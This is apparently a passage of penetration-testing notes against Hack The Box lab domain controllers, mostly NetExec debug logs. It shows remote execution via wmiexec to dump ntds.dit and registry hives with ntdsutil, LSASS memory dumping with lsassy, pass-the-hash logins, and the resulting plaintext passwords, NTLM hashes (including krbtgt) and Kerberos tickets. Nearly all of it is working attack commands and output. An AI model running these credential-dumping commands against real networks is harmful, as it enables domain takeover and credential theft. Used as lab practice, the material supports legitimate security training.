           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Modules to be Loaded for sanity check: ['ntdsutil'], <class 'list'>                                                                                                                                       netexec.py:182
           DEBUG    Loading module for sanity check ntdsutil at path /usr/lib/python3/dist-packages/nxc/modules/ntdsutil.py                                                                                                   netexec.py:189
           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.253.25, hostname=10.129.253.25, kerberos=False, ipv6=False, link-local ipv6=False                                                                                             connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.253.25                                                                                                                                                                    smb.py:606
[10:13:26] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[10:13:27] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[10:13:28] INFO     Creating SMBv1 connection to 10.129.253.25                                                                                                                                                                    smb.py:575
[10:13:29] INFO     SMBv1 disabled on 10.129.253.25                                                                                                                                                                               smb.py:598
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.253.25', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,   database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[10:13:29] INFO     SMB         10.129.253.25   445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.253.25                                                                                                                                                                    smb.py:606
[10:13:31] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.253.25                                                                                                                                                                    smb.py:646
[10:13:39] DEBUG    User is admin on 10.129.253.25!                                                                                                                                                                               smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.253.25                                                                                                                                                              database.py:133
           DEBUG    smb hosts() - results: [(2, '10.129.253.25', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                          database.py:485
[10:13:39] INFO     SMB         10.129.253.25   445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.253.25                                                                                                                                    smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.253.25                                                                                                                                                              database.py:133
           DEBUG    smb hosts() - results: [(2, '10.129.253.25', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                          database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7fcea302cd00>, hosts: [(2, '10.129.253.25', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)] database.py:362
           INFO     Loading modules for target: 10.129.253.25                                                                                                                                                              connection.py:589
           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
           DEBUG    Calling modules                                                                                                                                                                                        connection.py:238
           DEBUG    Loading module ntdsutil - <NXCModule.NXCModule object at 0x7fcea2ffc590>                                                                                                                               connection.py:273
           DEBUG    Loading context for module ntdsutil - <NXCModule.NXCModule object at 0x7fcea2ffc590>                                                                                                                   connection.py:283
           DEBUG    Module ntdsutil has on_admin_login method                                                                                                                                                              connection.py:297
[10:13:39] INFO     NTDSUTIL    10.129.253.25   445    DC               Dumping ntds with ntdsutil.exe to C:\Windows\Temp\175336641                                                                                           ntdsutil.py:45
[10:13:39] INFO     NTDSUTIL    10.129.253.25   445    DC               Dumping the NTDS, this could take a while so go grab a redbull...                                                                                     ntdsutil.py:46
           DEBUG    Executing command powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Windows\Temp\175336641' q q"                                                                                                 ntdsutil.py:47
[10:13:46] INFO     Executed command via wmiexec                                                                                                                                                                                  smb.py:722
           DEBUG    Executing remote                                                                                                                                                                                          wmiexec.py:102
           DEBUG    Executing command: cmd.exe /Q /c powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Windows\Temp\175336641' q q" 1> \Windows\Temp\JlEzrZ 2>&1                                                     wmiexec.py:115
[10:13:47] INFO     Attempting to read C$\\Windows\Temp\JlEzrZ                                                                                                                                                                wmiexec.py:148
[10:13:48] INFO     File C$\\Windows\Temp\JlEzrZ is still in use with 99 tries left, retrying...                                                                                                                              wmiexec.py:164
[10:13:49] INFO     Attempting to read C$\\Windows\Temp\JlEzrZ                                                                                                                                                                wmiexec.py:148
[10:13:50] INFO     File C$\\Windows\Temp\JlEzrZ is still in use with 98 tries left, retrying...                                                                                                                              wmiexec.py:164
[10:13:51] INFO     Attempting to read C$\\Windows\Temp\JlEzrZ                                                                                                                                                                wmiexec.py:148
[10:13:52] INFO     File C$\\Windows\Temp\JlEzrZ is still in use with 97 tries left, retrying...                                                                                                                              wmiexec.py:164
[10:13:53] INFO     Attempting to read C$\\Windows\Temp\JlEzrZ                                                                                                                                                                wmiexec.py:148
[10:13:55] DEBUG    Deleting file C$\\Windows\Temp\JlEzrZ                                                                                                                                                                     wmiexec.py:177
[10:13:56] DEBUG    Raw Output: C:\Windows\system32\ntdsutil.exe: ac i ntds                                                                                                                                                       smb.py:817
                    Active instance set to "ntds".                                                                                                                                                                                          
                    C:\Windows\system32\ntdsutil.exe: ifm                                                                                                                                                                                   
                    ifm: create full C:\Windows\Temp\175336641                                                                                                                                                                              
                    Creating snapshot...                                                                                                                                                                                                    
                    Snapshot set {5df0b48a-776e-4c0b-bf8f-b62113ab417c} generated successfully.                                                                                                                                             
                    Snapshot {ba0902cf-4cf7-4c88-ab06-5737f3a13131} mounted as C:\$SNAP_202507241713_VOLUMEC$\                                                                                                                              
                    Snapshot {ba0902cf-4cf7-4c88-ab06-5737f3a13131} is already mounted.                                                                                                                                                     
                    Initiating DEFRAGMENTATION mode...                                                                                                                                                                                      
                         Source Database: C:\$SNAP_202507241713_VOLUMEC$\Windows\NTDS\ntds.dit                                                                                                                                              
                         Target Database: C:\Windows\Temp\175336641\Active Directory\ntds.dit                                                                                                                                               
                                                                                                                                                                                                                                            
                                      Defragmentation  Status (% complete)                                                                                                                                                                  
                                                                                                                                                                                                                                            
                              0    10   20   30   40   50   60   70   80   90  100                                                                                                                                                          
                              |----|----|----|----|----|----|----|----|----|----|                                                                                                                                                           
                              ...................................................                                                                                                                                                           
                                                                                                                                                                                                                                            
                    Copying registry files...                                                                                                                                                                                               
                    Copying C:\Windows\Temp\175336641\registry\SYSTEM                                                                                                                                                                       
                    Copying C:\Windows\Temp\175336641\registry\SECURITY                                                                                                                                                                     
                    Snapshot {ba0902cf-4cf7-4c88-ab06-5737f3a13131} unmounted.                                                                                                                                                              
                    IFM media created successfully in C:\Windows\Temp\175336641                                                                                                                                                             
                    ifm: q                                                                                                                                                                                                                  
                    C:\Windows\system32\ntdsutil.exe: q                                                                                                                                                                                     
                                                                                                                                                                                                                                            
           DEBUG    Cleaned Output: C:\Windows\system32\ntdsutil.exe: ac i ntds                                                                                                                                                   smb.py:819
                    Active instance set to "ntds".                                                                                                                                                                                          
                    C:\Windows\system32\ntdsutil.exe: ifm                                                                                                                                                                                   
                    ifm: create full C:\Windows\Temp\175336641                                                                                                                                                                              
                    Creating snapshot...                                                                                                                                                                                                    
                    Snapshot set {5df0b48a-776e-4c0b-bf8f-b62113ab417c} generated successfully.                                                                                                                                             
                    Snapshot {ba0902cf-4cf7-4c88-ab06-5737f3a13131} mounted as C:\$SNAP_202507241713_VOLUMEC$\                                                                                                                              
                    Snapshot {ba0902cf-4cf7-4c88-ab06-5737f3a13131} is already mounted.                                                                                                                                                     
                    Initiating DEFRAGMENTATION mode...                                                                                                                                                                                      
                         Source Database: C:\$SNAP_202507241713_VOLUMEC$\Windows\NTDS\ntds.dit                                                                                                                                              
                         Target Database: C:\Windows\Temp\175336641\Active Directory\ntds.dit                                                                                                                                               
                                      Defragmentation  Status (% complete)                                                                                                                                                                  
                              0    10   20   30   40   50   60   70   80   90  100                                                                                                                                                          
                              |----|----|----|----|----|----|----|----|----|----|                                                                                                                                                           
                              ...................................................                                                                                                                                                           
                    Copying registry files...                                                                                                                                                                                               
                    Copying C:\Windows\Temp\175336641\registry\SYSTEM                                                                                                                                                                       
                    Copying C:\Windows\Temp\175336641\registry\SECURITY                                                                                                                                                                     
                    Snapshot {ba0902cf-4cf7-4c88-ab06-5737f3a13131} unmounted.                                                                                                                                                              
                    IFM media created successfully in C:\Windows\Temp\175336641                                                                                                                                                             
                    ifm: q                                                                                                                                                                                                                  
                    C:\Windows\system32\ntdsutil.exe: q                                                                                                                                                                                     
           DEBUG    C:\Windows\system32\ntdsutil.exe: ac i ntds                                                                                                                                                               ntdsutil.py:49
                    Active instance set to "ntds".                                                                                                                                                                                          
                    C:\Windows\system32\ntdsutil.exe: ifm                                                                                                                                                                                   
                    ifm: create full C:\Windows\Temp\175336641                                                                                                                                                                              
                    Creating snapshot...                                                                                                                                                                                                    
                    Snapshot set {5df0b48a-776e-4c0b-bf8f-b62113ab417c} generated successfully.                                                                                                                                             
                    Snapshot {ba0902cf-4cf7-4c88-ab06-5737f3a13131} mounted as C:\$SNAP_202507241713_VOLUMEC$\                                                                                                                              
                    Snapshot {ba0902cf-4cf7-4c88-ab06-5737f3a13131} is already mounted.                                                                                                                                                     
                    Initiating DEFRAGMENTATION mode...                                                                                                                                                                                      
                         Source Database: C:\$SNAP_202507241713_VOLUMEC$\Windows\NTDS\ntds.dit                                                                                                                                              
                         Target Database: C:\Windows\Temp\175336641\Active Directory\ntds.dit                                                                                                                                               
                                      Defragmentation  Status (% complete)                                                                                                                                                                  
                              0    10   20   30   40   50   60   70   80   90  100                                                                                                                                                          
                              |----|----|----|----|----|----|----|----|----|----|                                                                                                                                                           
                              ...................................................                                                                                                                                                           
                    Copying registry files...                                                                                                                                                                                               
                    Copying C:\Windows\Temp\175336641\registry\SYSTEM                                                                                                                                                                       
                    Copying C:\Windows\Temp\175336641\registry\SECURITY                                                                                                                                                                     
                    Snapshot {ba0902cf-4cf7-4c88-ab06-5737f3a13131} unmounted.                                                                                                                                                              
                    IFM media created successfully in C:\Windows\Temp\175336641                                                                                                                                                             
                    ifm: q                                                                                                                                                                                                                  
                    C:\Windows\system32\ntdsutil.exe: q                                                                                                                                                                                     
[10:13:56] INFO     NTDSUTIL    10.129.253.25   445    DC               NTDS.dit dumped to C:\Windows\Temp\175336641                                                                                                          ntdsutil.py:51
[10:13:56] INFO     NTDSUTIL    10.129.253.25   445    DC               Copying NTDS dump to /tmp/tmp8zixilnl                                                                                                                 ntdsutil.py:60
           DEBUG    Copy ntds.dit to host                                                                                                                                                                                     ntdsutil.py:62
[10:14:28] DEBUG    Copied ntds.dit file                                                                                                                                                                                      ntdsutil.py:70
           DEBUG    Copy SYSTEM to host                                                                                                                                                                                       ntdsutil.py:74
[10:14:49] DEBUG    Copied SYSTEM file                                                                                                                                                                                        ntdsutil.py:82
           DEBUG    Copy SECURITY to host                                                                                                                                                                                     ntdsutil.py:86
[10:14:52] DEBUG    Copied SECURITY file                                                                                                                                                                                      ntdsutil.py:94
[10:14:52] INFO     NTDSUTIL    10.129.253.25   445    DC               NTDS dump copied to /tmp/tmp8zixilnl                                                                                                                  ntdsutil.py:98
[10:14:59] INFO     Executed command via wmiexec                                                                                                                                                                                  smb.py:722
           DEBUG    Executing remote                                                                                                                                                                                          wmiexec.py:102
           DEBUG    Executing command: cmd.exe /Q /c rmdir /s /q C:\Windows\Temp\175336641 1> \Windows\Temp\lqKWij 2>&1                                                                                                       wmiexec.py:115
[10:15:00] INFO     Attempting to read C$\\Windows\Temp\lqKWij                                                                                                                                                                wmiexec.py:148
[10:15:01] DEBUG    Deleting file C$\\Windows\Temp\lqKWij                                                                                                                                                                     wmiexec.py:177
[10:15:02] DEBUG    Raw Output:                                                                                                                                                                                                   smb.py:817
           DEBUG    Cleaned Output:                                                                                                                                                                                               smb.py:819
[10:15:02] INFO     NTDSUTIL    10.129.253.25   445    DC               Deleted C:\Windows\Temp\175336641 remote dump directory                                                                                              ntdsutil.py:103
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.253.25                                                                                                                                                              database.py:133
           DEBUG    smb hosts() - results: [(2, '10.129.253.25', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                          database.py:485
[10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               Dumping the NTDS, this could take a while so go grab a redbull...                                                                                    ntdsutil.py:163
[10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::                                                               ntdsutil.py:121
[10:15:03] DEBUG    Adding credentials: [{'id': 7, 'domain': 'active.htb', 'username': 'Administrator', 'password': 'aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed', 'credtype': 'hash',                 database.py:332
                    'pillaged_from_hostid': None, 'pillaged_from': 2}]                                                                                                                                                                      
[10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                       ntdsutil.py:121
           DEBUG    Adding credentials: [{'id': 8, 'domain': 'active.htb', 'username': 'Guest', 'password': 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0', 'credtype': 'hash', 'pillaged_from_hostid': database.py:332
                    None, 'pillaged_from': 2}]                                                                                                                                                                                              
[10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:e133b7e6086d89fd4b58250bdbf7dcd0:::                                                                        ntdsutil.py:121
           DEBUG    Dumped hash is a computer account, not adding to db                                                                                                                                                      ntdsutil.py:140
[10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::                                                                      ntdsutil.py:121
           DEBUG    Adding credentials: [{'id': 9, 'domain': 'active.htb', 'username': 'krbtgt', 'password': 'aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc', 'credtype': 'hash',                        database.py:332
                    'pillaged_from_hostid': None, 'pillaged_from': 2}]                                                                                                                                                                      
[10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::                                                         ntdsutil.py:121
           DEBUG    Adding credentials: [{'id': 10, 'domain': 'active.htb', 'username': 'SVC_TGS', 'password': 'aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5', 'credtype': 'hash',                      database.py:332
                    'pillaged_from_hostid': None, 'pillaged_from': 2}]                                                                                                                                                                      
[10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               Dumped 5 NTDS hashes to None.ntds of which 4 were added to the database                                                                              ntdsutil.py:165
[10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               To extract only enabled accounts from the output file, run the following command:                                                                    ntdsutil.py:167
[10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               grep -iv disabled None.ntds | cut -d ':' -f1                                                                                                         ntdsutil.py:168
           DEBUG    Closing connection to: 10.129.253.25                                                                                                                                                                   connection.py:178
```


### -M lsassy
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' -M lsassy --debug
[15:12:07] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=['lsassy'], module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None,                            
                    no_s4u2proxy=False, domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None,                                  
                    generate_krb5_file=None, sam=None, lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False,                     
                    filter_shares=None, smb_sessions=False, disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False,                    
                    rid_brute=None, qwinsta=False, tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None,                       
                    regex=None, put_file=None, get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False,                    
                    amsi_bypass=None, clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                            
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Modules to be Loaded for sanity check: ['lsassy'], <class 'list'>                                                                                                                                         netexec.py:182
           DEBUG    Loading module for sanity check lsassy at path /usr/lib/python3/dist-packages/nxc/modules/lsassy.py                                                                                                       netexec.py:189
           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[15:12:09] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[15:12:10] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[15:12:12] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[15:12:13] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[15:12:13] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[15:12:15] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[15:12:24] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[15:12:24] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f6a3f780d70>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           INFO     Loading modules for target: 10.129.175.223                                                                                                                                                             connection.py:589
           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
           DEBUG    Calling modules                                                                                                                                                                                        connection.py:238
           DEBUG    Loading module lsassy - <NXCModule.NXCModule object at 0x7f6a3f608590>                                                                                                                                 connection.py:273
           DEBUG    Loading context for module lsassy - <NXCModule.NXCModule object at 0x7f6a3f608590>                                                                                                                     connection.py:283
           DEBUG    Module lsassy has on_admin_login method                                                                                                                                                                connection.py:297
[15:12:37] DEBUG    Found ThreadListStream @1ac Size: 1252                                                                                                                                                               minidumpfile.py:108
           DEBUG    Found ModuleListStream @69c Size: 10480                                                                                                                                                              minidumpfile.py:112
[15:12:38] DEBUG    Found Memory64ListStream @d3b1 Size: 10864                                                                                                                                                           minidumpfile.py:132
[15:12:41] DEBUG    Found SystemInfoStream @8c Size: 56                                                                                                                                                                  minidumpfile.py:122
[15:12:42] DEBUG    Found MiscInfoStream @c4 Size: 232                                                                                                                                                                   minidumpfile.py:168
[15:12:43] DEBUG    Found HandleDataStream @d3a1 Size: 16                                                                                                                                                                minidumpfile.py:152
           DEBUG    Found UnusedStream @0 Size: 0                                                                                                                                                                         minidumpfile.py:99
           DEBUG    Found UnusedStream @0 Size: 0                                                                                                                                                                         minidumpfile.py:99
           DEBUG    Found UnusedStream @0 Size: 0                                                                                                                                                                         minidumpfile.py:99
[15:14:38] DEBUG    Closed dumper file                                                                                                                                                                                          lsassy.py:74
           DEBUG    File path: /Windows/Temp//f18.otf                                                                                                                                                                           lsassy.py:76
[15:14:39] DEBUG    Deleted dumper file                                                                                                                                                                                         lsassy.py:80
           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password': None, 'domain': 'ACTIVE', 'lmhash': None, 'nthash': 'b708b6f85a816852dfd65a8f81ca175e', 'sha1':                                         lsassy.py:91
                    '63ea1ae4a533c1104e374c5c5c565a98df7a6d9f', 'ticket': None, 'ssp': 'msv_creds', 'masterkey': None}                                                                                                                      
           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password':                                                                                                                                         lsassy.py:91
                    'efd1bb12f57393e2d901e38aabc806bce83df809a3c69183e2b3d9bc3f4e5a03f53a24e1f2c01ca7f0c847cc9e169473a673c251eb734c8c2e509181337ce8fc502cefb1e76cc4df3d0b56a3aaedab8d56edc00d0bfc22bad09e2243a08d60fa7ab21d0cc7             
                    d3dde8db3b8a274365a0d2583ebb7bdf02bae7466dc929aaabd53212c9bf6532c18311a50da888f509d3329fea43eb17c2089a8a3eec6033f1e2db4a32888dcfc09ecd60909b71ca2235bb89d102aabc11d8bd8cf24106ddc521c4b3194594703c0369e3181             
                    e231fc9b140b614a422bfb153197242bf435d6992d4e0d2ee44102ba7130d05e8d3c03c7084', 'domain': 'ACTIVE', 'lmhash': None, 'nthash': None, 'sha1': None, 'ticket': None, 'ssp': 'wdigest_creds', 'masterkey': None}              
           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password': None, 'domain': 'ACTIVE.HTB', 'lmhash': None, 'nthash': None, 'sha1': None, 'ticket': {'file':                                          lsassy.py:91
                    'TGT_ACTIVE.HTB_DC$_krbtgt_ACTIVE.HTB_c7a0871e_20250726073852.kirbi', 'domain': 'ACTIVE.HTB', 'endtime': datetime.datetime(2025, 7, 26, 7, 38, 52, tzinfo=<pypykatz.commons.filetime.UTC object at                      
                    0x7f6a41ab7a10>)}, 'ssp': 'kerberos', 'masterkey': None}                                                                                                                                                                
           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password': None, 'domain': 'ACTIVE.HTB', 'lmhash': None, 'nthash': None, 'sha1': None, 'ticket': {'file':                                          lsassy.py:91
                    'TGT_ACTIVE.HTB_DC$_krbtgt_ACTIVE.HTB_dbb036d7_20250726072420.kirbi', 'domain': 'ACTIVE.HTB', 'endtime': datetime.datetime(2025, 7, 26, 7, 24, 20, tzinfo=<pypykatz.commons.filetime.UTC object at                      
                    0x7f6a41ab7a10>)}, 'ssp': 'kerberos', 'masterkey': None}                                                                                                                                                                
           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password': None, 'domain': 'ACTIVE.HTB', 'lmhash': None, 'nthash': None, 'sha1': None, 'ticket': {'file':                                          lsassy.py:91
                    'TGT_ACTIVE.HTB_DC$_krbtgt_ACTIVE.HTB_298305e7_20250726072420.kirbi', 'domain': 'ACTIVE.HTB', 'endtime': datetime.datetime(2025, 7, 26, 7, 24, 20, tzinfo=<pypykatz.commons.filetime.UTC object at                      
                    0x7f6a41ab7a10>)}, 'ssp': 'kerberos', 'masterkey': None}                                                                                                                                                                
           DEBUG    Credentials: []                                                                                                                                                                                             lsassy.py:96
           DEBUG    Calling process_credentials                                                                                                                                                                                lsassy.py:118
[15:14:39] INFO     LSASSY      10.129.175.223  445    DC               No credentials found                                                                                                                                   lsassy.py:123
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


## -M reg-winlogon
```sh
└─$ netexec smb 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -M reg-winlogon  --debug
[12:16:24] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
